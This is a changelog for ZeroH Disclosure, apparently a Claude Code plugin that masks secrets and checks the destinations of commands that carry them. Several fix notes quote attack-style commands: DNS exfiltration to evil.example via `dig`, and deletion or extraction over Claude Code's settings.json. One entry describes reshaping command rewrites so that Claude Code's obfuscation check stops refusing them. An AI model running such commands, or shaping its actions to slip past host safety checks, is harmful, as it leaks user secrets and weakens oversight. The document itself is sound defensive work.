# Changelog

## 1.0.1

- The settings guard no longer refuses paths that merely start with ZeroH's folder name (`~/.zeroh-backup`, `<home>-something`): a path counts as ZeroH's only when it is the folder or inside it.

Features: +guard.session-files, ~statusline, ~report-miss, ~report-miss.on-request,
~receipt.stop-line, ~allow.user-command, ~unmask.end-status, ~mask.tool-output,
~pass.uncertain-notice, ~display.real-values (see [docs/features.md](docs/features.md))

### Fixes from live use of 1.0.0

- **Add ZeroH to your own status line in one step.** When you already have a status line,
  `/zeroh-disclosure:settings statusline on` now adds ZeroH's part on its own line under yours
  instead of printing a long command to paste. Claude Code cuts a long line short with "…", so a
  part added at the end could not be seen; the style key `"position": "end"` puts it after your
  last line instead (`<your line> · 🛡️ ZeroH · 🟢 protected · …`). Your
  script is not changed: ZeroH runs your command with the same input, then shows its part; if your
  command fails, prints nothing or runs past 2 seconds (ZeroH then stops it and what it started),
  ZeroH's part shows alone. On Windows ZeroH doesn't add its part to your line yet (1.1); it
  leaves your status line as it is and points to docs/statusline.md. `statusline off` and uninstall put
  your status line back exactly. Claude can't do this for you; it is told to ask you to type the
  command. To compose it by hand, `docs/statusline.md` has the command, and Claude can read it
  from the about skill (`zeroh-disclosure statusline segment-command`) instead of searching the
  plugin's files.
- **The Stop line says what Claude got in plain words.** Up to three tokens (keys and passwords
  first), then the rest counted by kind and where they came from ("in your message", "in
  signup-errors.log", "in command output", "in <tool> output", "for STRIPE_KEY") instead of "⟦…⟧
  for typed". Personal data shows a short preview (`a…@domain`); a key, password or other secret
  shows no part of its start, only its last four characters when it is 24 characters or longer,
  because Claude Code keeps the line in the session transcript. `/zeroh-disclosure:mask-show` and receipt.html use the same
  plain-English sources.
- **Values shown under an unmask are counted once per tool call.** Three addresses read under a
  grant were counted as 6 on the Stop line and in the status line's `sent` count. Reading the same
  values again in a later tool call still counts them again.
- **Reporting a missed value no longer interrupts you.** When Claude spots an unmasked value
  itself, ZeroH masks it, keeps a local note and says so in one line, with no dialog.
  `/zeroh-disclosure:report-miss` is one private form: Submit masks the value and keeps a
  shape-only note, Cancel changes nothing. `/zeroh-disclosure:report-miss list` and
  `delete <id>` show and remove the notes; only you can delete. Reports stay on this computer; the
  dialog no longer promises sending in 1.1.
- **The briefing no longer says your transcript keeps only tokens.** Claude Code's own session
  file keeps what you type as you typed it (the proxy masks it on the way to the model), values
  shown under an unmask, and the real values ZeroH puts back into Edit, Write and MCP inputs; other
  tool output and file reads are saved with tokens. A command that copies, uploads or prints Claude
  Code's session files now runs with a notice, and `/zeroh-disclosure:settings uncertain block`
  stops it.
- **Claude writes the token in commands instead of reading secrets from environment variables**,
  so ZeroH checks the host. When a command still uses a variable ZeroH knows, the notice names it
  ("ZeroH couldn't check where $STRIPE_KEY went (it was loaded inside the command or the
  shell)…") and ends with "Type
  /zeroh-disclosure:settings uncertain block to stop these instead."
- **Claude no longer stalls before a host a value may not reach.** It is told that for a host
  ZeroH can read, ZeroH stops such a command before anything is sent, so it need not ask first for
  that reason. Where ZeroH can't tell the destination (a script, a variable host, git push), the
  real value is put back and the command runs with a notice, so Claude still asks you before
  sending a secret somewhere you didn't ask for.
- **When an unmask ends, Claude no longer takes back what it said.** `end_unmask` and the next
  prompt tell Claude that the values it saw during the grant now appear as tokens in its history,
  and that what it said about them was based on the real values.
- **`find … -exec … \;` works again.** ZeroH's exit-status wrapper put its `|| echo` between the
  `\` and the `;`, so find failed with "Expected '... ;'".
- **Allow a value you typed.** `/zeroh-disclosure:allow ⟦API_KEY-384bb5⟧ <host>` (or
  `[API_KEY-…]`, or `--remove`) targets the key you typed, the one a stop names. A raw value is
  stored as its token and one ZeroH doesn't know is refused, so the allow list never holds a
  secret. `/zeroh-disclosure:allow` lists typed keys by token, and "allowed:" now says "Ask Claude
  to try again."
- **Claude Code's own variables are not offered for allowing.** `CLAUDE_CODE_MESSAGING_TOKEN` and
  other `CLAUDE_CODE_*` values stay masked, but no longer appear in the allow list or the
  known-secrets count.

## 1.0.0

Features: +install.auto-update, +install.first-run, +runtime.node, +hooks.watchdog,
+proxy.lifecycle, +proxy.upstream, +mask.prompt-hook, +mask.background-output, +mask.documents,
+mask.write-input, +token.format, +restore.bash, +restore.powershell, +restore.file-tools,
+restore.mcp-server, +restore.scope, +restore.uncertain-destination, +pass.ran-with-token,
+allow.builtin-hosts, +guard.file-tools, +guard.shell, +guard.host-cli, +detect.secrets-context,
+detect.known-values, +detect.typed-random, +unmask.command, +unmask.end-status,
+receipt.stop-line, +receipt.retention, +receipt.slip-command, +report-miss.on-request,
+statusline.style, +statusline.json, +cmd.status, +mgmt.fix-commands, +settings.show,
+settings.user-config, +settings.repo-tighten-only, +proxy.toggle, +doctor, +vault.encrypted,
+platform.macos, +platform.linux, +platform.windows, +shell.powershell, ~install.plugin,
~mask.prompt, ~mask.context, ~mask.tool-output, ~mask.file-read, ~display.real-values,
~stop.disallowed-host, ~allow.user-command, ~pass.uncertain-notice, ~settings.uncertain-block,
~detect.keys-gitleaks, ~detect.pii-33, ~unmask.dialog, ~receipt.signed, ~report.local,
~report-miss, ~banner.session-start, ~statusline, ~mgmt.user-authority, ~vault.retention,
~uninstall.clean, -restore.allowed-host, -statusline.custom, -guard.settings, -proxy.manage (see
[docs/features.md](docs/features.md))

### Fixes from live use of 1.0.0-rc.1 and rc.2

- **A value from your context is put back in a local command.** An email Claude Code loads from
  `CLAUDE.md` reaches the model as a token. When Claude set it as the git author
  (`git -c user.email=<token> commit`), the commit was made with the token text. Two causes, both
  fixed: the proxy also masked sessions ZeroH's hooks don't run in (a session with the plugin
  disabled, or one Claude Code starts without plugins), where nothing can put a token back; those
  sessions now pass through unmasked, as without ZeroH. And in a session with the hooks, the
  address's own domain was read as a destination, so the restore was stopped; an email address
  used as data is no longer a destination (`ssh user@host` still names one).
- **An `az` command to your own server is no longer stopped twice.** Claude created an Azure Bot
  whose endpoint was `https://pm.<IP>.sslip.io/…` with `--query sku.name`, after ZeroH had masked
  the server's IP. The command was stopped as the IP leaving for `pm.<IP>.sslip.io` and for
  `sku.name`. Both fixed: an IP address put back into a host that is that address or is built
  from it (`sslip.io`, `nip.io`, `https://<IP>:8443`, `ssh root@<IP>`) is where the call goes,
  not data sent there; and a bare dotted word (`sku.name`, `compute.zone`, `image.tag=…`,
  `app.kubernetes.io/name`, `-o jsonpath={.status}`, `config.yaml`) or address is a destination
  only as a network command's operand, in a URL, as `user@host` or as `host:port`, no longer
  because its last label happens to be a TLD. A command ZeroH can't read (`az`, `aws`, `gcloud`,
  `kubectl`, `terraform`, `docker`) is an uncertain destination as before: it runs with a notice,
  and `block` mode denies it. A key put back towards a URL or network operand that isn't allowed
  for it is still stopped, and so is an IP sent to any other host.
- **The receipt says when a value went out in plain text.** `raw_content_sent_to_ai_provider` was
  always `false`, even for a prompt sent as typed while the proxy wasn't running. It is now `true`
  for such a prompt, and the signed turn summary says the same for the whole turn (values shown
  under an unmask grant included) as `values_sent_to_ai_provider`, a name of its own so the two
  scopes can't be confused. Earlier receipts still verify.
- **A plain word is masked where it appears as a password, no longer everywhere.** A lowercase
  word typed after `password=` was masked as a PASSWORD, and then everywhere that word appeared,
  in every later file and command output. It is still masked where it follows `password=` (the
  same text is a real password in a shell export, a connection string or a sentence that tells
  one; `/zeroh-disclosure:unmask` shows it), but a plain word ZeroH found by the name before it,
  typed or in output, is no longer matched anywhere else. Such words kept from earlier versions
  stop spreading too. Your `.env` and credential-file values and values you report still match
  everywhere.
- **GitHub App tokens in their new format are masked whole.** GitHub App installation tokens,
  including the Actions `GITHUB_TOKEN`, now come as `ghs_<app id>_<JWT>` (about 520 characters,
  two dots; [GitHub changelog](https://github.blog/changelog/2026-05-15-github-app-installation-tokens-per-request-override-header/)).
  The gitleaks rules match only the old 40-character form, so such a token in a prompt, a file or
  command output was not found. A local rule in the detection engine now finds it and masks all of
  it; the old form is still found. GitHub announced no new format for its other token types.

### Fixes from the architecture review

- **No dead tokens when the vault can't be saved.** A vault that opens but can't be saved (another
  writer holds its lock, a disk error) made ZeroH send new values as tokens nothing could put back.
  Every mask path (the proxy, tool output, a raw secret written into a file) now keeps masked only
  the values already on disk and passes new ones unmasked, with the line "not protected (ZeroH
  couldn't save its vault) · /zeroh-disclosure:doctor", counted under a new reason,
  `vault-unsaveable`. The proxy can't show a line itself, so the turn's Stop line says it. With
  `uncertain block` the output is withheld or the call stopped instead.
- **A proxy without a login item no longer strands a session.** Where the system refuses the login
  item, the proxy leaves once no ZeroH session is live. It closed its port, so a session still
  using it (the plugin disabled in that project, or a session Claude Code started without plugins)
  failed with "Connection refused". It now takes its settings entries out as before and then keeps
  serving that session, unmasked, until it has been idle for 12 hours; the next ZeroH session
  replaces it.
- **After uninstall the proxy masks nothing.** The retired proxy kept replacing values it knew with
  tokens after uninstall, though the vault and hooks that put tokens back were gone, so commands and
  the screen got dead tokens. It now passes everything through until the session ends. After
  `proxy off` and `doctor --fix` it still masks the values it masked before (the vault and hooks
  remain), and a session it never masked passes through, as before it retired.
- **Claude Code's settings are protected however git or an archiver is called.** The guard read
  program options with checks of its own, apart from the destination check, and they had drifted:
  `git -C /tmp rm ~/.claude/settings.json` was read as the subcommand `/tmp` and passed, as did
  `tar --to-command=sh`, `sort --compress-program=sh`, `zip -TT` and `sort -o` against a settings
  file, while `rg -e --pre` (searching for the text `--pre`) was stopped. The guard now uses the same
  readers as the destination check, so these are stopped (or read) the same way everywhere.
- **The turn summary's format is frozen.** `zeroh-turn-summary/v1` verifies only with exactly the
  fields 1.0.0 signs; a new field will be a `v2` schema. A development build's summary without
  `values_sent_to_ai_provider` no longer verifies (no release signed one). Receipts from release
  candidates, which have no summary, still verify as covering the typed prompt only.
- **What ZeroH says matches what it does.** `/zeroh-disclosure:status` said a secret in the prompt
  that puts a session behind the proxy "is stopped, not sent"; by default it is sent with a "not
  protected" line (stopped with `uncertain block`), and the line now says whichever applies. The
  full banner of a session whose proxy is down said both that a secret is sent with a notice and
  that it is stopped; no prompt is sent until the proxy is back, and it now says only that. The
  unused "no login item, what you type can't be masked" state is gone (without a login item the
  proxy runs for the session and masks typing). The how-to and troubleshooting pages no longer
  say that requests the proxy can't tie to a ZeroH session are masked: they pass through unmasked.

### Fixes from the pre-1.0.0 review

- **Unpacking an archive into Claude Code's settings is stopped.** `tar -xf a.tar -C ~/.claude
settings.json` replaced `settings.json` with no stop and no line. The command reader now resolves
  the files `tar`, `unzip -d` and `7z x -o` extract against their folder, so a named protected file
  is the default stop; unpacking files ZeroH can't name into a protected folder runs with the "not
  protected" line (`uncertain block` stops it).
- **A retired proxy masks each session with its own project's values.** After `proxy off` or
  `doctor --fix` the retired proxy used one catalog of every project's values for every session,
  so a value known only in one project reached another project's session as a token nothing there
  could put back.
- **A prompt sent as typed because the vault couldn't be saved says so.** The proxy then masks only
  the values already in the vault, but the receipt, the Stop line ("1 value masked", "Claude saw
  ⟦…⟧") and the signed turn summary said the new values were masked. They now count them as sent
  (`values_sent`, `values_sent_to_ai_provider`, `raw_content_sent_to_ai_provider`), and the
  "not protected" record of the prompt is kept. With `uncertain block` the proxy also passes such
  values, by design: refusing the request would end the session (see the
  [product principles](docs/product-principles.md)).
- **A value put back into a DNS name is checked.** `dig -q <token>.evil.example.com` ran with the
  real value in both modes: the value of `-q` was read as an option value, not a name. Every
  option of a network program that names a host, a name or a URL is now a destination (`dig -q`
  and `-x`, `curl --dns-servers` and `--ipfs-gateway`, `wget -e http_proxy=`, the proxy options of
  `aria2c`, `httpie` and `ncat`, SOCKS and PROXY addresses in `socat`, `ssh -W`, `-L` and `-R`,
  the ssh inside `rsync -e` and `mosh --ssh`, `git remote add` and `set-url`, `openssl
-servername`, `traceroute -g`, `mtr`, `tracepath`, `Resolve-DnsName -Name/-Server`); what reads
  names from a file (`dig -f`, `drill -f`, `mtr -F`) or runs a program (`socat SYSTEM:`, `scp -S`)
  is uncertain. A name with a token in one of its labels is the destination as a whole, so a value
  that can't be read as a host name stops too, and a deny shows such a name with the token, never
  the value.
- **A value in a name lookup is checked wherever it stands.** `dig +domain=<token>.evil.example
probe` and `nslookup -domain=…` ran with the value in a search domain. For the programs that look
  names up (`dig`, `nslookup`, `host`, `drill`, `delv`, `kdig`, `getent hosts`, `resolvectl`,
  `dscacheutil`, `nmap`, `Resolve-DnsName`) every argument with a value put back in it is now a
  destination, since the name servers receive it; an IP address looked up as itself is its own.
- **Only an IP address's own name is exempt for it.** A restored IP was accepted for any host that
  contained it (`203.0.113.7.evil.example.com`), and then also as data in the same command. The
  exception now covers exactly the address (any port, `[v6]`) and its names on the address-mapping
  services `sslip.io` and `nip.io` (`<ip>.sslip.io`, `<a-b-c-d>.sslip.io`, `pm.<ip>.sslip.io`,
  `pm-<a-b-c-d>.nip.io`, IPv6 as `2001-db8--1.sslip.io`); the address as data to that same host is
  allowed, as data to any other host it is checked.
  A mapping name counts only when the address is the only address-like sequence in it: the
  services pick the first one, so `198.51.100.9.x.<ip>.sslip.io` goes to 198.51.100.9.
- **Text a shell does not expand is never a variable.** After PowerShell's `--%` everything is
  passed as written, so a credential there is a literal: it was taken for a variable and ran with a
  notice. It now stops like any literal when its host isn't allowed. The same holds for single
  quotes, here-strings and backtick escapes in PowerShell and for `$'…'`, backslash escapes and
  quoted here-docs in Bash. Code handed to another shell (`eval`, `bash -c`, `pwsh -Command`, `iex`,
  `cmd /c`, `env -S`) is read twice, so a variable written into it is not proven to be the value;
  where that code is one single-quoted string, the inner shell's own reading decides. Checked
  against real Bash and PowerShell.
- **A variable you typed in the prompt is judged as a variable.** Your prompt's
  `-u "<variable>:"` reached Claude as a token (the detector masks references like any value);
  Claude ran the command with the token, and ZeroH stopped `api.stripe.com` as a secret leaving.
  A value put back that, in the command's shell, is only a variable reference is now judged like
  one Claude wrote: it runs with the "not protected (a variable whose value ZeroH cannot see)" line
  (`uncertain block` stops it). Being a variable's name, not a value, it is put back inline where
  the token stands, so the shell expands your variable as typed (it was sent as its name before):
  only where that occurrence is expanded by the shell, and braced (`${STRIPE_KEY}_SUFFIX`) so the
  name keeps its end. An occurrence the shell reads as text (single quotes, `$'…'`, an escape,
  after `--%`) is a value like any other: checked against its host and put back as text.
- **A token after PowerShell's `--%` is not put back as a variable name.** PowerShell passes that
  text as written, so the late-bound variable arrived as its own name. Only a real stop-parsing
  token counts, as the command reader finds it; `--%` inside a string or a comment is text. ZeroH never writes a real
  value into the command text, so such a call follows the rule for a value that can't be put back
  safely: it runs with the token and a notice (`uncertain block` stops it).
- **A kept receipt's unmask record can't be edited after uninstall.** Uninstall now signs, with the
  receipt's own key, the exact unmask record it checked; `verify` fails a kept receipt whose record
  changed since, and says "unavailable" (not passed) for one kept without that signature.

### Fixes from the macOS and Windows test runs

- **One project, whatever path leads to it.** ZeroH keys a project's vault, allow list, unmask
  grants and receipts on the folder with links resolved. On macOS a folder under `/var` or `/tmp`
  is `/private/var` or `/private/tmp` to a terminal, so `zeroh-disclosure allow` in a terminal and
  the hooks in Claude Code kept that project twice; the same held for any project under a linked
  folder.
- **Credential files in a linked home are read again.** When the home folder itself sat behind a
  link, every credential file in it (`~/.aws/credentials`, `~/.npmrc`, `~/.netrc`, …) was refused,
  so their values were not known secrets.
- **Commands with a backslash restore correctly in Git Bash on Windows.** Git Bash reads a pair of
  backslashes on its command line as one, so a restored command whose heredoc line ended in `\`
  joined the next line, and `"\[TOKEN]"` printed a variable name. ZeroH no longer writes a new
  pair of backslashes into the command it hands to Git Bash.
- **Git Bash drive paths are protected.** A Bash command on Windows that wrote ZeroH's plugin files
  or Claude Code's settings through `/c/Users/…` was not recognised as one; it now is, like
  `C:\Users\…`.
- **A Windows install is no longer reported as stale.** Git for Windows checks text files out
  with CRLF line ends, and the integrity check compared them byte for byte with the release. It
  now compares them as Git stores them. The plugin's checkout also keeps LF line ends.
- **`~/.netrc` counts on Windows too.** curl reads `%USERPROFILE%\.netrc` before `_netrc`; ZeroH
  now knows the passwords in both, and treats `_netrc` as a sensitive file.
- **An early `exit 0` is not a failure.** A Bash command that ended with `exit 0` got the line
  "the command failed with exit status 0".
- **The status line is red for a ZeroH home it can't use on Windows** (a home below a file), not
  "starting".
- **The ZeroH home on Windows is really yours only.** ZeroH gives its home an ACL for you and
  SYSTEM only, but a folder that already had entries of its own (a `ZEROH_HOME` on a shared drive,
  a temporary folder) kept them, so Administrators or Everyone could still read the vault and keys.
  Those entries are removed now, and a home an earlier build set up is fixed at the next write.
- **Parallel first use and parallel unmask changes work on Windows.** Two sessions starting at once
  on a fresh install could fail with "vault key missing", and a grant made while another was
  revoked could fail with `EPERM` (Windows reports a lock file still being deleted that way).

### Fixes from the Windows 11 test of 1.0.0-rc.2

- **The login item registers on Windows.** `schtasks /Create /XML` refused the task file ("The task
  XML is malformed … unable to switch the encoding"), because it was saved as UTF-8. It is now
  saved as UTF-16 with a byte order mark and declares `encoding="UTF-16"`, the form Task Scheduler
  reads. A UTF-8 file an earlier release left behind is registered again at the next session.
- **No login item no longer means typed secrets go out unmasked.** Where the system refuses the
  login item (a locked-down PC, a managed Mac, SSH, WSL or a container), ZeroH now starts its local
  proxy for the session anyway, so what you type is masked. With no ZeroH session open, the proxy
  takes its settings entry out and stops, so a Claude Code session never meets a dead port; the
  next session starts it again and tries the login item again. The banner, `/zeroh-disclosure:status`
  and `/zeroh-disclosure:doctor` say "no login item", with the reason the system gave (for example
  `schtasks refused it: "ERROR: The task XML is malformed."`) and the fix for your system.
- **"Sent" means one thing everywhere.** A key typed once was counted by the detector and again as a
  known value from `.env` (2 values typed, "4 sent"), while the receipt said 0. "Sent" is now each
  value that reached the model in plain text, counted once: a typed value sent without the proxy
  plus values shown under an unmask grant. The status line, the Stop line, the receipt slip and
  `/zeroh-disclosure:report` all count it this way ([receipt format](docs/receipt-format.md#the-signed-turn-summary)).
- **The receipt signs everything it shows.** The receipt signed when you send a prompt covers the
  typed prompt; a turn summary signed at Stop now covers the rest: file reads and command output
  masked, values sent, destinations, formats and operations that passed unchecked, and misses
  reported. The receipt and slip show the signed numbers, and `zeroh-disclosure verify` fails when
  any of them changes. Receipts from earlier versions still verify and say they cover the typed
  prompt only.
- **A restored command runs headless.** Claude Code refused ZeroH's rewrite of try step 6 ("Contains
  brace with quote character (expansion obfuscation)"): the wrapper ran the command in a `{ … }`
  group, and Claude Code's check (`/\{[^}]*['"]/` outside quotes, Claude Code 2.1.281 to 2.1.283)
  flags any group with a quote in it. The command now runs in the `then` branch of the `if` that
  loads the values, and every rewrite is tested against that check. PowerShell reads restored
  values with cmdlets only (`Import-Csv` from a CSV values file, no .NET calls, which Claude Code's
  PowerShell checks ask about). A values file whose command never ran is removed at once when
  Claude Code reports the failure or refusal (`PostToolUseFailure`, `PermissionDenied`), or at the
  end of the turn, not at the next session.
- **A shell variable is not a key.** When Claude wrote `curl -u "$STRIPE_KEY:"`, the curl-credential
  rule took the variable reference for the key and ZeroH blocked `api.stripe.com` as a raw secret.
  The command now runs. Whether `$KEY` is a variable or literal text depends on which program reads
  it, so the detector no longer guesses: it masks a reference like any value (restorable; it is put
  back in commands and on screen), as rc.2 did, and literal passwords that look like references
  (`${X-hunter2x}`, `$X-hunter2x`, which rc.2 also missed) are masked too. The stop is decided where
  the shell is known: in a Bash or PowerShell command, a value that, as that shell parses it, is
  only variable references (`$KEY`, `${KEY}`, `$1`, `$env:KEY`, `${env:KEY}`, PowerShell's
  `$($env:KEY)`, joined by `:`) is not
  a raw secret. ZeroH can't see what the variable holds, so a command that sends it somewhere runs
  with the line "not protected (a variable whose value ZeroH cannot see)" and a new receipt reason,
  `variable-in-command`; `uncertain block` stops it. Anything with a literal in it (single quotes,
  `%KEY%` or `{{x}}` in Bash, a default, a command substitution) still stops as before when its
  host isn't allowed.
- **`/zeroh-disclosure:status` says what is true.** It shows whether the local proxy is running and
  whether this session goes through it, and whether a login item starts it after a restart (and if
  not, why and how to fix it), instead of saying typing is masked when no proxy runs.
- **The try-it example is the Stripe one.** The `httpbin.org` demo never finished reliably; the
  how-to and the about skill now use the website's test guide: a made-up key, `api.stripe.com`, and
  a `401 Invalid API Key` whose last four characters prove the real value arrived.
- **`@zeroh` not found.** A Claude Code profile that added the public marketplace before its rename
  on 25 September keeps it as `zeroh-marketplace`. The first prompt and `/zeroh-disclosure:doctor`
  now say so, with the commands: `claude plugin marketplace remove zeroh-marketplace`, then
  `claude plugin marketplace add Blade-Labs/zeroh-marketplace` and
  `claude plugin install zeroh-disclosure@zeroh`. The marketplace README's install steps check for it.

### The session banner: big once, then one line

The big ZEROH banner no longer greets you every session. The first session after the install still
shows it with what is masked; every later session shows one line:

```text
ZeroH Disclosure ✓ Protected: your secrets are masked · Free · /zeroh-disclosure:status
```

The line is honest: when something needs attention it says so and names the fix, for example
`ZeroH Disclosure ⚠ Paused: see the message below · Free · /zeroh-disclosure:doctor`, or
`/zeroh-disclosure:proxy on` after you turned the proxy off. Warnings still print below it.

`/zeroh-disclosure:settings banner big|compact|mini|off` chooses: `big` is the ZEROH banner every
session, `mini` the one line (the default), `compact` one line with the secret count. A `full` saved
or set in `ZEROH_BANNER` before 1.0.0 keeps working and means `big`.

The full view after the install is shorter too: under the art, one line says it runs on your machine
and what it masks, one says what passes (images and scanned PDFs), and one gives the question to ask
Claude. The proxy's own state is no longer repeated there; when it matters, its warning line says so.

### Uninstall in one step, and the session you are in keeps working

- `/zeroh-disclosure:uninstall` removes ZeroH in one step: typing the user-only command is the
  confirmation. `--dry-run` only shows what it would remove, and `--yes` is still accepted. In a
  terminal, `zeroh-disclosure uninstall` still needs `--yes`, since a script could call it.
- Uninstall, `/zeroh-disclosure:proxy off` and `doctor --fix` no longer stop the local proxy under
  the session you typed them in. A running Claude Code session keeps the proxy address it started
  with, so a stopped proxy made its next request fail ("Connection refused", ten retries). The proxy
  is now retired instead: it keeps forwarding for the sessions still open and stops by itself once
  no request has come for 12 hours. After `proxy off` and `doctor --fix` it masks only the values
  Claude already saw as tokens (from memory, never written) and nothing new; after uninstall it
  masks nothing, since the vault and hooks that could put a token back are gone. Its login item is
  gone on macOS, Linux and Windows, so nothing starts it again. Uninstall says so: "This session
  keeps working until you exit, without ZeroH's masking; new sessions start without ZeroH."
- Uninstall keeps your receipts. Everything else goes (the vault and keys, your settings, allow
  rules, grants, reports, the proxy's runtime copy); every signed receipt, `receipt.html` and
  session bundle, with the public keys that verify them, move to `~/ZeroH Receipts`
  (`%LOCALAPPDATA%\ZeroH Receipts` on Windows). They hold no values, no private key and no vault.
  The output (and `--dry-run`) says where they are and how to delete them; `--delete-receipts`
  removes them too, with any an earlier uninstall kept. `verify` still checks a kept receipt after
  a new install.

### Real values on screen, reliably

A reply could show a plain token such as `[EMAIL-…]` where the real value belonged (seen in a fenced
code block on rc.1). Claude Code shows a reply in flushes of whole lines, so a token is never cut in
two; but a flush whose display hook runs out of time is shown as Claude Code sent it, with tokens.
The hook now loads only what it needs (no detectors, no proxy code), answers before it saves the
vault's last-use bookkeeping, and an answer already given stands even if that bookkeeping runs late.
In a Claude Code version that does cut a token across two flushes, the fragment is held back and
shown whole with the next flush, never lost or repeated. `ZEROH_DISPLAY_TRACE=1` logs how a reply
was flushed (lengths only, never text).

### Updating from a release candidate

- `claude plugin update` keeps a plugin folder that already exists for the new version (Claude Code
  2.1.283), so a `plugins/cache/zeroh/zeroh-disclosure/<version>` folder an earlier build left
  behind stays in use. `/zeroh-disclosure:doctor` and the session start now compare the folder with
  the release Claude Code recorded, say when it differs, and give the fix (quit Claude Code, remove
  that folder, `claude plugin install zeroh-disclosure@zeroh`). See
  [troubleshooting](docs/troubleshooting.md#an-update-left-an-old-plugin-folder-in-use).
- A release candidate now sorts below its release, so a session of 1.0.0-rc.x left open after the
  update never copies its proxy back over 1.0.0's. (rc.2 itself compares them as equal: close rc.2
  sessions before updating.) The update from 1.0.0-rc.2 is checked live (`update-flow.mjs`).
- Projects are keyed on their path with links resolved (see "One project, whatever path leads to
  it" above), and there is no migration from a release candidate's key. If your project sits under
  a linked folder (on macOS, anything under `/tmp` or `/var` counts), it starts 1.0.0 with an empty
  vault, no allow rules and no unmask grants: tokens in a conversation resumed from the release
  candidate run as the token text (with the "ran with the token" line), and you allow hosts again
  with `/zeroh-disclosure:allow`. Receipts of the release candidate stay in its old folder. Values
  the vault held expire after 7 days anyway.

### Claude knows when to suggest doctor

The install steps no longer end with a pointer to `/zeroh-disclosure:doctor`. Instead the session
briefing tells Claude to suggest it when you say protection isn't working or ZeroH shows 🟡 or 🔴.
Claude never runs it itself.

### The feature list, checked against the code

Apart from the changes above, nothing the plugin does has changed. The [feature list](docs/features.md) was checked against the
code and the tests on 2026-09-28, and the Codex and OpenCode columns against the hosts' current
releases:

- **66 features in ten areas**, each area its own table (it was 25 rows in one table). The `+` IDs
  above shipped already and now have a row of their own. A feature that works the same way on every
  host, or a subcommand of a larger feature, stays in that feature's row.
- **Split where hosts differ:** `restore.allowed-host` became `restore.bash` and
  `restore.powershell`, with rows for file tools, MCP servers, where real values never go and
  uncertain destinations; `guard.settings` became `guard.file-tools`, `guard.shell` and
  `guard.host-cli`; `statusline.custom` became `statusline.style` and `statusline.json`;
  `proxy.manage` became `proxy.toggle` and `doctor`; prompts masked by the proxy
  (`mask.prompt`) and checked by the hook (`mask.prompt-hook`) are separate rows.
- **Says what the default does.** A prompt typed while the proxy isn't running, or the one that
  sets it up, is sent with a notice; a value bound for a destination ZeroH can't read is restored
  with a notice; a command whose effect on ZeroH's files can't be read runs with a notice. The key
  count reads "221 key-format rules from gitleaks v8.30.1: 214 for a named provider's keys and 7
  generic ones"; personal data is "decided by" a library or published rule, not always a checksum;
  `/zeroh-disclosure:report` prints text (HTML and JSON come from the command-line tool); values
  leave the vault after 7 days without use.
- **Platforms:** Codex CLI 0.158.0, OpenCode 1.x (`opencode-ai` 1.18.33) and OpenCode 2
  (`@opencode/cli` 2.0.18, a separate package with a new plugin API, now its own column), each
  status with a short note and, in `docs/features.json`, the sources it rests on. GitHub Copilot,
  Cursor and Gemini CLI get a "Next platforms" table for the core features.
- `docs/features.json` gains `area`, `core` and per-platform `sources`; old fields are unchanged.
- [docs/parity-open-questions.md](docs/parity-open-questions.md) lists the questions only a live
  run can answer, each with its check.

### Corrections

- README: the version badge, the settings command's arguments, and the hosts that are always
  allowed: `localhost`, all of `127.0.0.0/8`, `0.0.0.0` and `::1` (the code already allowed them).
- The rc.2 `Features:` line missed IDs whose Claude Code behaviour changed in rc.2: `~mask.prompt`
  (without the proxy a typed secret is sent with a notice, no longer stopped),
  `~restore.allowed-host` (uncertain destinations), `~allow.user-command`, `~proxy.manage`,
  `~uninstall.clean` and `~vault.retention` (management applied on the typed prompt; `vault clear`
  needs `--yes`; `uninstall` without `--yes` only shows what it would remove), `~report.local` and
  `~receipt.signed` (counts read from the signed receipt), and `~mask.context` (a vault that can't
  be opened passes content with a line). The rc.2 section stays as published, so it matches the
  rc.2 release notes.

## 1.0.0-rc.2

Features: +statusline, +statusline.custom, +settings.uncertain-block, ~install.plugin, ~mask.tool-output,
~pass.uncertain-notice, ~mgmt.user-authority,
~stop.disallowed-host, ~guard.settings, ~mask.file-read, ~detect.keys-gitleaks (see
[docs/features.md](docs/features.md))

### Pass by default: ZeroH never takes away what Claude Code can do

New [product principles](docs/product-principles.md): mask what we can, pass what we can't, and
say so. By default only two things are stopped: a secret heading to a host that isn't allowed for
it, and the model changing ZeroH's own protection. Everything ZeroH can't check runs as it would
without ZeroH, with one plain line such as
`ZeroH Disclosure: this command was not protected (dynamic destination).`, shown once per reason
per turn; the first one in a session adds how to block these instead. The Stop line counts them
("N operations not protected"), and the receipt and `/zeroh-disclosure:report` list them by reason.
`/zeroh-disclosure:settings uncertain block` restores the stops. What changed by default:

- A prompt with a secret typed while the local proxy isn't running is sent, with a
  "not protected (proxy not running)" line and how to fix it (it was stopped).
- Background commands and `Monitor` without the proxy run with the same line (they were denied).
- SSH keys, kubeconfig, AWS credentials, `.netrc` and other credential files can be read; what the
  detector finds in them is masked (they were refused). ZeroH's own keys stay refused.
- A known secret the model writes into a command gets the same destination rules as a restored
  one: an allowed host runs, a host that isn't allowed is stopped with the allow command, and an
  uncertain destination runs with a line suggesting `/zeroh-disclosure:report-miss` and rotating
  the key (it was denied).
- A secret sent to a destination ZeroH can't work out (a `$HOST` variable, a script, an unknown
  launcher, a command it can't parse) is restored as before, with a line.
- A prompt over 256 KB is sent unscanned, and a prompt ZeroH can't mask because it can't open its
  vault is sent through the proxy, each with a line (both were stopped).
- A hook that runs out of time passes the content through with a "timed out" line; the watchdog
  answers two seconds before Claude Code's own timeout.
- The last eight default stops pass too, each with its line, recorded on the turn:
  - a project `.zeroh.env` that can't be read: the defaults and your own settings apply
    ("not protected (couldn't read .zeroh.env; using defaults)"), and the session start says so;
  - tool output over 1 MB goes to Claude unscanned ("not protected (too large to scan)"), and
    output whose check fails goes as it is ("not protected (check failed)"); both were withheld;
  - when ZeroH can't open its vault, tool output, file reads and prompts through the proxy go as
    they are, with "not protected (ZeroH couldn't open its vault) · /zeroh-disclosure:doctor"
    (the proxy used to refuse the request). A new product principle: never mask what we can't
    restore, because a dead token would break your commands, edits and screen;
  - a raw secret in a WebFetch URL gets the destination rules, like one in a command: an allowed
    host runs, a host that isn't allowed is stopped with the allow command (it was denied);
  - when ZeroH can't put a value back, the call runs with the token and says so ("ran with the
    token, not your key: …"): the vault can't be opened (`/zeroh-disclosure:doctor`), the value
    expired (read the file again), a `Monitor` command (it can't receive restored values), or a
    command ZeroH couldn't prepare the value for. Claude is told too, so it can fix the call. These
    were denied. The Stop line counts them apart ("N operations ran with the token, not your
    key"), and they don't count as "not protected" on the status line.

  No stop is left open for an owner decision; the deny-inventory test now checks that.

### Status line: always see whether you're protected

